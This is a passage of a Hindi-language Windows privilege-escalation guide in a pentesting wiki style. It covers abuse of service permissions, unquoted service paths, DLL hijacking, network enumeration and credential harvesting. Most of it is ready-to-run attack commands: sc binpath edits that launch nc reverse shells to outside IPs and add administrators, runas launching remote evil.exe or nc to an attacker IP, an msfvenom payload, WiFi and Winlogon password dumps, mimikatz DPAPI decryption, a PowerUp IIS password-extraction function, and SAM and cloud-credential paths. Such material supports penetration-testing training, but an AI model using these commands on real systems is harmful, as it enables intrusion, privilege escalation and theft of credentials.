[आप यहाँ से XP के लिए accesschk.exe डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 हुई है।_\
_सेवा शुरू नहीं की जा सकती, या तो इसे निष्क्रिय किया गया है या इसके साथ कोई सक्षम उपकरण जुड़ा है नहीं है।_

आप इसे सक्षम कर सकते हैं इस्तेमाल करके
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान दें कि सेवा upnphost SSDPSRV पर निर्भर है ताकि काम करे (XP SP1 के लिए)**

**इस समस्या का एक और उपाय** यह है:
```
sc.exe config usosvc start= auto
```
### **सेवा बाइनरी पथ को संशोधित करें**

यदि समूह "प्रमाणित उपयोगकर्ता" में **SERVICE\_ALL\_ACCESS** है तो वह सेवा द्वारा निष्पादित बाइनरी को संशोधित कर सकता है। इसे संशोधित करने और **nc** को निष्पादित करने के लिए आप कर सकते हैं:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनः आरंभ करें
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
अन्य अनुमतियों का उपयोग विशेषाधिकारों को बढ़ाने के लिए किया जा सकता है:\
**SERVICE\_CHANGE\_CONFIG** सेवा बाइनरी को पुनर्विन्यासित कर सकता है\
**WRITE\_DAC:** अनुमतियों को पुनर्विन्यासित कर सकता है, जो SERVICE\_CHANGE\_CONFIG में ले जाता है\
**WRITE\_OWNER:** मालिक बन सकता है, अनुमतियों को पुनर्विन्यासित कर सकता है\
**GENERIC\_WRITE:** SERVICE\_CHANGE\_CONFIG को विरासत में प्राप्त होता है\
**GENERIC\_ALL:** SERVICE\_CHANGE\_CONFIG को विरासत में प्राप्त होता है

**इस भेद्यता का पता लगाने और उसका शोषण करने** के लिए आप _exploit/windows/local/service\_permissions_ का उपयोग कर सकते हैं

### सेवा बाइनरी कमजोर अनुमतियाँ

**जांचें कि क्या आप सेवा द्वारा निष्पादित बाइनरी को संशोधित कर सकते हैं** या क्या आपके पास उस फोल्डर पर **लेखन अनुमतियाँ** हैं जहां बाइनरी स्थित है ([**DLL Hijacking**](dll-hijacking.md))**.**\
आप **wmic** का उपयोग करके (system32 में नहीं) सेवा द्वारा निष्पादित प्रत्येक बाइनरी प्राप्त कर सकते हैं और **icacls** का उपयोग करके अपनी अनुमतियों की जांच कर सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप भी **sc** और **icacls** का उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सेवाओं रजिस्ट्री संशोधन अनुमतियाँ

आपको यह जांचनी चाहिए कि क्या आप किसी सेवा रजिस्ट्री को संशोधित कर सकते हैं।\
आप निम्नलिखित करके किसी सेवा रजिस्ट्री पर अपनी अनुमतियों की जांच कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जांचें कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास FullControl है। इस मामले में आप सेवा द्वारा निष्पादित किया जाने वाला बाइनरी बदल सकते हैं।

बाइनरी निष्पादित करने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### सेवाएं रजिस्ट्री AppendData/AddSubdirectory अनुमतियाँ

यदि आपके पास रजिस्ट्री पर यह अनुमति है तो इसका मतलब है कि **आप इससे एक सब रजिस्ट्री बना सकते हैं**। Windows सेवाओं के मामले में यह **किसी भी अवचेतनीपूर्ण कोड को निष्पादित करने के लिए पर्याप्त है:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### अन-कोटेड सेवा पथ

यदि किसी एक्जीक्यूटेबल का पथ उद्धरण के भीतर नहीं है, तो Windows हर स्पेस से पहले समाप्ति को निष्पादित करने का प्रयास करेगा।

उदाहरण के लिए, पथ _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निष्पादित करने का प्रयास करेगा:
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
अन-कोटेड सेवा पथों की सूची बनाने के लिए (बिल्ट-इन Windows सेवाओं को छोड़कर)
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस वंलरबिलिटी का पता लगा सकते हैं और इसका शोधन कर सकते हैं** मेटास्प्लॉइट के साथ: _exploit/windows/local/trusted\_service\_path_\
आप मेटास्प्लॉइट के साथ मैन्युअल रूप से एक सेवा बाइनरी बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### पुनर्प्राप्ति कार्रवाई

Windows को सूचित करना संभव है कि यह क्या करना चाहिए [जब एक सेवा को निष्फल होते समय](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN)। यदि उस सेटिंग को एक बाइनरी की ओर इशारा कर रहा है और यह बाइनरी अधिक लिखा जा सकता है, तो आपको वरीयता बढ़ाने की संभावना हो सकती है।

## एप्लिकेशन्स

### स्थापित एप्लिकेशन्स

**बाइनरी की अनुमतियों** की जांच करें (शायद आप एक को अधिक लिख सकते हैं और वरीयता बढ़ा सकते हैं) और **फोल्डर्स** की ([DLL हाइजैकिंग](dll-hijacking.md))।
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लेखन अनुमतियाँ

जांचें कि क्या आप किसी कॉन्फ़िग फ़ाइल को संशोधित कर सकते हैं ताकि कोई विशेष फ़ाइल पढ़ सके या यदि आप किसी बाइनरी को संशोधित कर सकते हैं जो एडमिनिस्ट्रेटर खाते द्वारा निष्पादित किया जाएगा (schedtasks)।

सिस्टम में कमजोर फोल्डर/फ़ाइल अनुमतियों को खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### शुरुआत में चलाएं

**जांचें कि क्या आप किसी रजिस्ट्री या बाइनरी को अधिक लिख सकते हैं जो किसी अलग उपयोगकर्ता द्वारा चलाया जाएगा।**\
**निम्नलिखित पृष्ठ** को पढ़ें और अधिक जानें **उच्चतम अधिकार प्राप्ति के लिए दिलचस्प autoruns स्थानों** के बारे में:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### ड्राइवर्स

**संभावित** **तीसरे पक्ष के अजीब/वंशाश्रयी** **ड्राइवर्स** की खोज करें
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL हाइजैकिंग

यदि आपके पास **PATH पर मौजूद एक फोल्डर में लेखन अनुमतियाँ** हैं तो आपको किसी प्रक्रिया द्वारा लोड की जाने वाली एक DLL को हाइजैक करके **विशेषाधिकारों को उन्नत करने** की क्षमता हो सकती है।

PATH में सभी फोल्डरों की अनुमतियों की जांच करें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस जाँच को कैसे दुरुपयोग करने के बारे में अधिक जानकारी के लिए:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## नेटवर्क

### साझा करें
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### होस्ट्स फ़ाइल

होस्ट्स फ़ाइल पर हार्डकोड किए गए अन्य ज्ञात कंप्यूटरों की जांच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और डीएनएस
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### ओपन पोर्ट्स

बाहर से **प्रतिबंधित सेवाएं** जांचें
```bash
netstat -ano #Opened ports?
```
### रूटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**फ़ायरवॉल संबंधित कमांड्स के लिए इस पेज की जाँच करें**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूची, नियम बनाएं, बंद करें, बंद करें...)**

और यहाँ [नेटवर्क जांच के लिए अधिक कमांड्स](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है।

अगर आप रूट उपयोगकर्ता प्राप्त करते हैं तो आप किसी भी पोर्ट पर सुन सकते हैं (`nc.exe` का प्रथम बार पोर्ट पर सुनने के लिए उपयोग करने पर यह फायरवॉल द्वारा अनुमति देने के लिए GUI के माध्यम से पूछेगा)।
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
## Windows Credentials

### Winlogon Credentials

बूट के समय विंडोज क्रेडेंशियल्स को विनलोगन के माध्यम से प्राप्त किया जा सकता है।
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault उन उपयोगकर्ता क्रेडेंशियल्स को संग्रहित करता है जो **Windows** उपयोगकर्ताओं को **स्वतः लॉग इन करने** में सक्षम हैं। पहली दृष्टि में, यह ऐसा दिख सकता है कि अब उपयोगकर्ता अपने Facebook क्रेडेंशियल्स, Twitter क्रेडेंशियल्स, Gmail क्रेडेंशियल्स आदि को संग्रहीत कर सकते हैं, ताकि वे ब्राउज़र के माध्यम से स्वतः लॉग इन करें। लेकिन ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को संग्रहित करता है जिन्हें Windows उपयोगकर्ताओं को स्वतः लॉग इन करने में सक्षम है, जिसका मतलब है कि कोई भी **Windows एप्लिकेशन जो किसी संसाधन (सर्वर या वेबसाइट) तक पहुंचने के लिए क्रेडेंशियल्स की आवश्यकता होती है**, वह Credential Manager और Windows Vault का उपयोग कर सकता है और उपयोगकर्ताओं के द्वारा प्रदान किए गए क्रेडेंशियल्स का उपयोग कर सकता है बिना उपयोगकर्ताओं को हर बार उपयोगकर्ता नाम और पासवर्ड दर्ज करने की आवश्यकता हो।

यदि एप्लिकेशन Credential Manager के साथ संवाद करने की आवश्यकता है, तो मुझे लगता है कि उन्हें दिए गए संसाधन के लिए क्रेडेंशियल्स का उपयोग करना संभव नहीं है। इसलिए, यदि आपकी एप्लिकेशन वॉल्ट का उपयोग करना चाहती है, तो उसे किसी प्रकार से **क्रेडेंशियल मैनेजर के साथ संवाद करना चाहिए और डिफ़ॉल्ट स्टोरेज वॉल्ट से उस संसाधन के लिए क्रेडेंशियल्स का अनुरोध करना चाहिए**।

मशीन पर संग्रहित क्रेडेंशियल्स की सूची देखने के लिए `cmdkey` का उपयोग करें।
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
तो आप `runas` का उपयोग `/savecred` विकल्प के साथ कर सकते हैं ताकि सहेजे गए क्रेडेंशियल का उपयोग किया जा सके। निम्नलिखित उदाहरण एक SMB सेयर के माध्यम से एक रिमोट बाइनरी को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
एक प्रदत्त सेट के क्रेडेंशियल के साथ `runas` का उपयोग करें।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
नोट करें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1) से।

### DPAPI

सिद्धांत में, डेटा संरक्षण API किसी भी प्रकार के डेटा का सममित एन्क्रिप्शन सक्षम कर सकता है; व्यावहारिक रूप से, विंडोज ऑपरेटिंग सिस्टम में इसका प्राथमिक उपयोग एक्सीमेट्रिक निजी कुंजियों का सममित एन्क्रिप्शन करना है, एक उपयोगकर्ता या सिस्टम रहस्य को एंट्रोपी के महत्वपूर्ण योगदान के रूप में उपयोग करते हुए।

**DPAPI डेवलपरों को उपयोगकर्ता के लॉगऑन रहस्य से एक सममित कुंजी का उत्पन्न करके कुंजियों को एन्क्रिप्ट करने की अनुमति देता है**, या सिस्टम एन्क्रिप्शन के मामले में, सिस्टम के डोमेन प्रमाणीकरण रहस्य का उपयोग करते हुए।

उपयोगकर्ता की RSA कुंजियों को एन्क्रिप्ट करने के लिए उपयोग किए जाने वाले DPAPI कुंजी `%APPDATA%\Microsoft\Protect\{SID}` निर्देशिका में संग्रहीत की जाती है, जहां {SID} उस उपयोगकर्ता का [सुरक्षा पहचानकर्ता](https://en.wikipedia.org/wiki/Security\_Identifier) है। **DPAPI कुंजी उन उपयोगकर्ता की निजी कुंजियों को संरक्षित करने वाली मास्टर कुंजी के साथ ही एक ही फ़ाइल में संग्रहीत की जाती है**। यह आम तौर पर 64 बाइट के यादृच्छिक डेटा होती है। (ध्यान दें कि यह निर्देशिका संरक्षित है, इसलिए आप इसे `cmd` से सूचीबद्ध कर नहीं सकते हैं, लेकिन आप PS से इसे सूचीबद्ध कर सकते हैं)।
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप **mimikatz मॉड्यूल** `dpapi::masterkey` का उपयोग कर सकते हैं सही तरीके से तर्क (`/pvk` या `/rpc`) के साथ इसे डिक्रिप्ट करने के लिए।

**मास्टर पासवर्ड द्वारा संरक्षित क्रेडेंशियल फ़ाइलें** आम तौर पर इसमें स्थित होती हैं:
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप **mimikatz मॉड्यूल** `dpapi::cred` का उपयोग कर सकते हैं उपयुक्त `/masterkey` के साथ डिक्रिप्ट करने के लिए।\
आप `sekurlsa::dpapi` मॉड्यूल के साथ **मेमोरी** से **कई DPAPI मास्टरकी** निकाल सकते हैं (अगर आप रूट हैं)।

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Credentials

**PowerShell credentials** अक्सर **स्क्रिप्टिंग** और स्वचालन कार्यों के लिए उपयोग किए जाते हैं जिसे एन्क्रिप्टेड क्रेडेंशियल को सुविधाजनक रूप से स्टोर करने का एक तरीका माना जाता है। क्रेडेंशियल्स को **DPAPI** का उपयोग करके सुरक्षित किया जाता है, जिसका मतलब है कि उन्हें केवल उसी उपयोगकर्ता द्वारा उसी कंप्यूटर पर जिन्हें बनाया गया था, डिक्रिप्ट किया जा सकता है।

फ़ाइल में से PS क्रेडेंशियल्स को डिक्रिप्ट करने के लिए आप कर सकते हैं:
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### वाईफाई
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजी गई RDP कनेक्शन

आप उन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` में ढूंढ सकते हैं\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में।

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz** के `dpapi::rdg` मॉड्यूल का उपयुक्त `/masterkey` के साथ उपयोग करें **किसी भी .rdg फ़ाइलों** को **डिक्रिप्ट** करने के लिए।\
आप **Mimikatz** के `sekurlsa::dpapi` मॉड्यूल के साथ मेमोरी से **कई DPAPI मास्टरकी** निकाल सकते हैं।

### स्टिकी नोट्स

लोग अक्सर स्टिकी नोट्स ऐप का उपयोग विंडोज वर्कस्टेशन पर **पासवर्ड सहेजने** और अन्य जानकारी के लिए करते हैं, जिसे एक डेटाबेस फ़ाइल माना जाता है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित है और हमेशा खोजने और जांचने के लायक होती है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से पासवर्ड पुनर्प्राप्त करने के लिए आपको व्यवस्थापक होना चाहिए और उच्च अभियांत्रिकी स्तर के तहत चलाना होगा।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` निर्देशिका में स्थित है।\
यदि यह फ़ाइल मौजूद है तो संभावना है कि कुछ **क्रेडेंशियल्स** कॉन्फ़िगर किए गए हों और **पुनर्प्राप्त** किए जा सकते हैं।

यह कोड [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से निकाला गया था:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है।\
इंस्टॉलर **SYSTEM विशेषाधिकारों के साथ चलाए जाते हैं**, बहुत से **DLL Sideloading** के लिए संवेदनशील होते हैं (**जानकारी** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**)।**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (क्रेडेंशियल्स)

### पुटी क्रेडेंशियल
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कुंजी
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH कुंजी

SSH निजी कुंजियाँ रजिस्ट्री कुंजी `HKCU\Software\OpenSSH\Agent\Keys` में संग्रहित की जा सकती हैं, इसलिए आपको यह जांचना चाहिए कि क्या वहाँ कुछ दिलचस्प है:
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
यदि आप उस पथ में कोई एंट्री पाते हैं तो शायद वहाँ एक सहेजी गई SSH कुंजी हो। यह एन्क्रिप्टेड रूप में स्टोर की गई है लेकिन [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके आसानी से डिक्रिप्ट किया जा सकता है।\
इस तकनीक के बारे में अधिक जानकारी यहाँ उपलब्ध है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` सेवा चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वचालित रूप से चालू हो, तो निम्नलिखित को चलाएँ:
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
ऐसा लगता है कि यह तकनीक अब वैध नहीं है। मैंने कुछ ssh कुंजी बनाने की कोशिश की, उन्हें `ssh-add` के साथ जोड़ा और ssh के माध्यम से किसी मशीन पर लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric कुंजी प्रमाणीकरण के दौरान `dpapi.dll` का उपयोग नहीं किया।
{% endhint %}

### अनअटेंडेड फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum\_unattend_

उदाहरण सामग्री\_:\_
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM और SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल खोजें जिसका नाम **SiteList.xml** है

